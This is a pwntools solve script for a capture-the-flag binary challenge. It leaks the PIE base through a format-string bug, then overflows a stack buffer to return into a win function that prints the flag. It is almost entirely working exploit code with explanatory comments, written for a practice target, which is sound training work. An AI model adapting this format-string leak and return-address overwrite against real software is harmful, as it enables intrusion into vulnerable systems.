#!/usr/bin/env python3
from __future__ import annotations

from pwn import *

# Exploit for: Meow_mi-miauuwwww
#
# Bug chain:
# 1) Format string in menu option 1 -> leak a PIE code address (we fish for a pointer into main()).
# 2) Stack overflow in menu option 2 -> overwrite RIP and return-to-win into meow() to print flag.txt.
#
# Protections (checksec): PIE + NX, but no canary -> ret2win is the simplest path.

elf = context.binary = ELF("./meow")
context.terminal = ["bash", "-lc"]


def start():
    # Usage:
    #   - Local : python3 solve.py
    #   - Remote: python3 solve.py REMOTE=1 HOST=... PORT=...
    if args.REMOTE:
        host = args.HOST or "chall-ctf.ara-its.id"
        port = int(args.PORT or 54317)
        return remote(host, port)
    return process(elf.path)


def leak_pie_base(io) -> int:
    # We want any stack leak that points into `main`.
    # Since the binary is PIE, runtime addresses look like:
    #   leaked_main = pie_base + elf.sym['main']
    #
    # The low 12 bits (page offset) are stable under ASLR, so we match by:
    #   leaked_ptr & 0xfff == (elf.sym['main'] & 0xfff)
    want = elf.sym["main"] & 0xFFF

    def try_indices(indices):
        # Send a short "spray" format string: %18$p|%19$p|... and parse tokens.
        # In our local tests, one of these indices consistently contains a return address into main().
        fmt = b"|".join([f"%{i}$p".encode() for i in indices])
        io.sendlineafter(b"meow meow meow ^^: ", b"1")
        io.sendlineafter(b"diintip: )", fmt)
        io.recvuntil(b"Meow, ")
        leak_line = io.recvline().strip().split(b"|")
        for tok in leak_line:
            if not tok.startswith(b"0x"):
                continue
            v = int(tok, 16)
            if (v & 0xFFF) == want:
                # pie_base = leaked_main - main_offset
                return v - elf.sym["main"]
        return None

    base = try_indices(range(18, 25))
    if base is not None:
        return base

    # Fallback: brute single indices (keeps the format string short).
    for i in range(1, 41):
        io.sendlineafter(b"meow meow meow ^^: ", b"1")
        io.sendlineafter(b"diintip: )", f"%{i}$p".encode())
        io.recvuntil(b"Meow, ")
        tok = io.recvline().strip()
        if tok.startswith(b"0x"):
            v = int(tok, 16)
            if (v & 0xFFF) == want:
                return v - elf.sym["main"]

    raise RuntimeError("failed to leak PIE base")


def main():
    io = start()

    base = leak_pie_base(io)
    meow_addr = base + elf.sym["meow"]

    # amd64 stack alignment note:
    # Jumping into a function via `ret` (not `call`) can break the SysV ABI
    # 16-byte stack alignment expectation. On remote, jumping directly to meow()
    # crashes, so we insert a single `ret` gadget first to realign the stack by 8.
    #
    # Find a plain `ret` gadget inside the PIE, then add PIE base.
    rop = ROP(elf)
    ret_gadget_off = rop.find_gadget(["ret"]).address
    ret_gadget = base + ret_gadget_off

    # Option 2 reads up to 0x100 bytes into a 0x40 stack buffer.
    # Offset to saved RIP (from cyclic) is 72 bytes on amd64 here.
    io.sendlineafter(b"meow meow meow ^^: ", b"2")
    payload = b"A" * 72 + p64(ret_gadget) + p64(meow_addr)
    io.send(payload + b"\n")

    # meow() prints the flag then calls exit().
    #
    # Default behavior: read everything and exit cleanly (works in non-interactive runners).
    # If you want to manually interact, run: python3 solve.py REMOTE=1 INTERACTIVE=1
    if args.INTERACTIVE:
        io.interactive()
        return

    out = io.recvall(timeout=3) or b""
    try:
        print(out.decode(errors="replace"), end="")
    finally:
        io.close()


if __name__ == "__main__":
    main()
